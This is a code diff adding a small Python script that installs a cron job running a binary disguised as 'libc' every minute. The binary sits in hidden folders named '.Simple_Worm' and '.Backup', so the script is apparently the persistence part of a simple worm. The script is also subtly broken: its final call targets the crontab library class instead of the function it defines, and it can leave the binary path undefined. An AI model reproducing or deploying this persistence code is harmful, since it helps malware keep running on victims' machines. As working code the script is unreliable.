@@ -1,0 +1,18 @@
+#!/usr/bin/env python3
+import os
+from subprocess import Popen, PIPE
+from crontab import CronTab
+import sys
+
+def Crontab():
+    if os.path.exists('/home/attacker/Public/.Simple_Worm/libc'):
+        exe = '/home/attacker/Public/.Simple_Worm/libc'
+    elif os.path.exists('/home/attacker/Desktop/.Backup/libc'):
+        exe = '/home/attacker/Desktop/.Backup/libc'
+    cron = CronTab(user = 'attacker')
+    job = cron.new(command = exe)
+    job.minute.every(1)
+    cron.write()
+
+CronTab()
+
